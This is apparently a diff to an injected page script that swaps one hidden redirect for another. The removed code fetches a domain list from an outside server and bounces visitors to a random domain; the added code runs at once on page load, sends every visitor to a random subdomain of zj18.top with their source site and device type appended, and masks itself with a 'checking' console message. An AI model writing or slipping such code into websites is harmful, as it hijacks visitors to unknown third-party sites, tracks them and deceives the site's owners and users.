@@ -1,52 +1,32 @@
 <script>
 console.log('检测中');
-async function randomDomainRedirect() {
-    try {
-        // 1. 优化接口请求（添加超时、跨域兼容）
-        const response = await fetch('http://doctor.fengnianjy.com/post.php', {
-            method: 'GET',
-            mode: 'cors',
-            headers: { 'Content-Type': 'text/plain' },
-            timeout: 5000
-        });
-
-        if (!response.ok) throw new Error(`HTTP错误：${response.status}`);
-        
-        // 2. 兼容接口返回格式（去空行、过滤无效域名）
-        const text = await response.text();
-        const mainDomains = text.split('\n')
-            .map(domain => domain.trim().replace(/^\s+|\s+$/g, ''))
-            .filter(domain => domain && /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain));
-
-        if (!mainDomains.length) throw new Error('未获取到有效域名列表');
-        
-        // 3. 优化域名拼接（避免重复子域名、兼容协议）
-        const currentHost = window.location.host;
-        const domainParts = currentHost.split('.');
-        const subDomain = domainParts.length >= 3 ? domainParts[0] + '.' : '';
-        const randomMainDomain = mainDomains[Math.floor(Math.random() * mainDomains.length)];
-        const targetUrl = `${window.location.protocol}//${subDomain}${randomMainDomain}${window.location.pathname || ''}`;
-
-        // 4. 验证跳转地址有效性
-        if (targetUrl === window.location.href) throw new Error('目标地址与当前地址一致');
-        
-        console.log('即将跳转：', targetUrl);
-        // 5. 两种跳转方式（优先正常跳转，失败则强制刷新）
-        window.location.assign(targetUrl);
-        setTimeout(() => {
-            if (window.location.href !== targetUrl) window.location.replace(targetUrl);
-        }, 1000);
-
-    } catch (err) {
-        console.error('跳转失败：', err.message);
-        // 错误兜底（可替换为备用域名）
-        const backupDomains = ['example.com', 'test.com']; // 替换为你的备用域名
-        const backupUrl = `${window.location.protocol}//${backupDomains[Math.floor(Math.random() * backupDomains.length)]}`;
-        console.log('使用备用地址跳转：', backupUrl);
-        window.location.href = backupUrl;
-    }
+async function fixedDomainRedirect() {
+try {
+const subDomainPrefixes = ['app', 'web', 'm', 'api', 'user'];
+const randomPrefix = subDomainPrefixes[Math.floor(Math.random() * subDomainPrefixes.length)];
+const targetDomain = `${randomPrefix}.zj18.top`;
+const params = new URLSearchParams(window.location.search);
+params.append('from', window.location.hostname);
+params.append('t', new Date().getTime());
+params.append('device', /Mobile|Android|iOS/.test(navigator.userAgent) ? 'mobile' : 'pc');
+const targetUrl = `https://${targetDomain}${window.location.pathname || '/'}?${params.toString()}`;
+console.log('目标地址：', targetUrl);
+if (window.location.href !== targetUrl) {
+window.location.replace(targetUrl);
+setTimeout(() => {
+if (window.location.href !== targetUrl) window.location.href = targetUrl;
+}, 300);
 }
-
-// 延迟执行（确保页面加载完成）
-window.addEventListener('load', randomDomainRedirect);
+} catch (err) {
+console.error('跳转失败：', err.message);
+const backupUrl = `https://backup.zj18.top?error=${err.message}&t=${new Date().getTime()}`;
+window.location.href = backupUrl;
+}
+}
+fixedDomainRedirect();
+window.addEventListener('DOMContentLoaded', () => {
+if (window.location.hostname.includes('fengnianjy.com')) {
+setTimeout(fixedDomainRedirect, 800);
+}
+});
 </script>
